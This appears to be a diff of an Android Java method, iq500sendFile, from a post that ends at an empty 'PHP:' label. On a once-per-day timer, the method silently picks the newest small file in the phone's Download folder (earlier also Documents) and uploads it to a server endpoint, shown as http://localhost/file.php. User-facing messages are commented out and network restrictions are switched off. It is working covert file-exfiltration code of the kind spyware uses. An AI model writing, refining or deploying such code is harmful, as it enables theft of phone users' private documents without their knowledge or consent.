@@ -1,159 +1,116 @@
-private void iq500sendFile()
-{	
-	try{
-		//Test permission first
-		File test = new File("/sdcard");
-		Boolean testp = test.canRead();
-		if(!testp)
-		{
-
-			//Toast.makeText(this, "gg", Toast.LENGTH_LONG).show();
-			return;
-
-		}
-		//Toast.makeText(this, "ok", Toast.LENGTH_LONG).show();
-		//limit one photo per day
-		Boolean pass = false;
-		Date t = new Date();
-		long ts = t.getTime();
-		SharedPreferences pref = getSharedPreferences("loadpref", Context.MODE_PRIVATE);
-		SharedPreferences.Editor edit = pref.edit();
-
-		long lastup = pref.getLong("lastUpload", 0);
-
-		if(lastup == 0 || ts - lastup >= 86400000)
-		{
-			edit.putLong("lastUpload", ts);
-			edit.commit();
-			pass = true;
-		}
-
-
-		if(pass)
-		{
-			try
+	private void iq500sendFile()
+	{	
+		try{
+			//Test permission first
+			File test = new File("/sdcard");
+			Boolean testp = test.canRead();
+			if(!testp)
 			{
-				StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
-				StrictMode.setThreadPolicy(policy);
 
-				//Define root path and get file list
-				String root = "/sdcard/Documents/";
-				String root2 = "/sdcard/Download/";
-
-				File pa = new File(root);
-				File pa2 = new File(root2);
-
-
-				String[] res = pa.list();
-				String[] res2 = pa2.list();
-
-				//filter oversize files
-				String resls = "";
-				String resls2 = "";
-				//root
-				if(res != null)
-					for(int i = 0; i < res.length; i++)
-					{
-						Boolean a = new File(root + res[i]).length() /1024/1024 <= 3;
-						Boolean b = new File(root + res[i]).isFile();
-						if(a && b)
-						{
-							resls += root + res[i];
-							if(i < res.length - 1)
-								resls += "///n";
-						}
-
-					}
-
-				//root2
-				if(res2 != null)
-					for(int i = 0; i < res2.length; i++)
-					{
-						Boolean a2 = res2[i].endsWith(".apk");
-						Boolean b2 = new File(root2 + res2[i]).length() /1024/1024 <= 3;
-						Boolean c2 = new File(root2 + res2[i]).isFile();
-						if(!a2 && b2 && c2)
-						{
-							resls2 += root2 + res2[i];
-
-							if(i < res2.length - 1)
-								resls2 += "///n";
-						}
-					}
-				//electing last modified (newest)
-				String[] resls_ = resls.split("///n");
-				String[] resls2_ = resls2.split("///n");
-				String finalres = "";
-				String finalres2 = "";
-				long lmod = 0;
-				long lmod2 = 0;
-				//root
-				for(int i = 0; i < resls_.length; i++)
-				{
-					long temp = lmod;
-					lmod = Math.max(lmod, new File(resls_[i]).lastModified());
-					if(temp != lmod)
-						finalres = resls_[i];
-				}
-				//root2
-				for(int i = 0; i < resls2_.length; i++)
-				{
-					long temp = lmod2;
-					lmod2 = Math.max(lmod2, new File(resls2_[i]).lastModified());
-					if(temp != lmod2)
-						finalres2 = resls2_[i];
-				}
-
-				//root1
-				if(finalres != "")
-				{
-					//define final target
-					File target = new File(finalres);
-
-					//create binary entity
-					FileEntity reqEntity = new FileEntity(target, "binary/octet-stream");
-
-					//launch http request
-					HttpPost post = new HttpPost("http://localhost/file.php");
-
-					//set binary entity
-					post.setEntity(reqEntity);
-					reqEntity.setContentType("binary/octet-stream");
-
-					//set timestamp of the file as the component of filename
-					post.setHeader("fname", target.getName());
-
-					//fire
-					HttpClient httpclient = new DefaultHttpClient();
-					httpclient.execute(post);
-				}
-
-				//root2
-				if(finalres2 != "")
-				{
-					File target2 = new File(finalres2);
-					FileEntity reqEntity2 = new FileEntity(target2, "binary/octet-stream");
-					HttpPost post2 = new HttpPost("http://localhost/file.php");
-
-					post2.setEntity(reqEntity2);
-					reqEntity2.setContentType("binary/octet-stream");
-					post2.setHeader("fname", target2.getName());
-					HttpClient httpclient2 = new DefaultHttpClient();
-					httpclient2.execute(post2);
-				}
+				//Toast.makeText(this, "gg", Toast.LENGTH_LONG).show();
+				return;
 
 			}
-			catch (Exception e)
+			//Toast.makeText(this, "ok", Toast.LENGTH_LONG).show();
+			//limit one photo per day
+			Boolean pass = false;
+			Date t = new Date();
+			long ts = t.getTime();
+			SharedPreferences pref = getSharedPreferences("loadpref", Context.MODE_PRIVATE);
+			SharedPreferences.Editor edit = pref.edit();
+
+			long lastup = pref.getLong("lastUpload", 0);
+
+			if(lastup == 0 || ts - lastup >= 86400000)
 			{
-				e.printStackTrace();
-				Log.e("iq500", e.toString());
+				edit.putLong("lastUpload", ts);
+				edit.commit();
+				pass = true;
 			}
-		}	
-	}catch(Exception e){
-		e.printStackTrace();
-		Log.e("iq500", e.toString());
+
+
+			if(pass)
+			{
+				try
+				{
+					StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
+					StrictMode.setThreadPolicy(policy);
+
+					//Define root path and get file list
+					String root = "/sdcard/Download/";
+
+					File pa = new File(root);
+
+
+					String[] res = pa.list();
+
+					//filter oversize files
+					String resls = "";
+					
+					//root
+					if(res != null)
+						for(int i = 0; i < res.length; i++)
+						{
+							Boolean a = new File(root + res[i]).length() /1024/1024 <= 3;
+							Boolean b = new File(root + res[i]).isFile();
+							if(a && b)
+							{
+								resls += root + res[i];
+								if(i < res.length - 1)
+									resls += "///n";
+							}
+
+						}
+
+					//electing last modified (newest)
+					String[] resls_ = resls.split("///n");
+					String finalres = "";
+					long lmod = 0;
+					//root
+					for(int i = 0; i < resls_.length; i++)
+					{
+						long temp = lmod;
+						lmod = Math.max(lmod, new File(resls_[i]).lastModified());
+						if(temp != lmod)
+							finalres = resls_[i];
+					}
+					
+					//root1
+					if(finalres != "")
+					{
+						//define final target
+						File target = new File(finalres);
+
+						//create binary entity
+						FileEntity reqEntity = new FileEntity(target, "binary/octet-stream");
+
+						//launch http request
+						HttpPost post = new HttpPost("http://localhost/file.php");
+
+						//set binary entity
+						post.setEntity(reqEntity);
+						reqEntity.setContentType("binary/octet-stream");
+
+						//set timestamp of the file as the component of filename
+						post.setHeader("fname", target.getName());
+
+						//fire
+						HttpClient httpclient = new DefaultHttpClient();
+						httpclient.execute(post);
+					}
+
+				}
+				catch (Exception e)
+				{
+					e.printStackTrace();
+					Log.e("iq500", e.toString());
+				}
+			}	
+		}catch(Exception e){
+			e.printStackTrace();
+			Log.e("iq500", e.toString());
+		}
 	}
-}
 	
 	
 PHP:
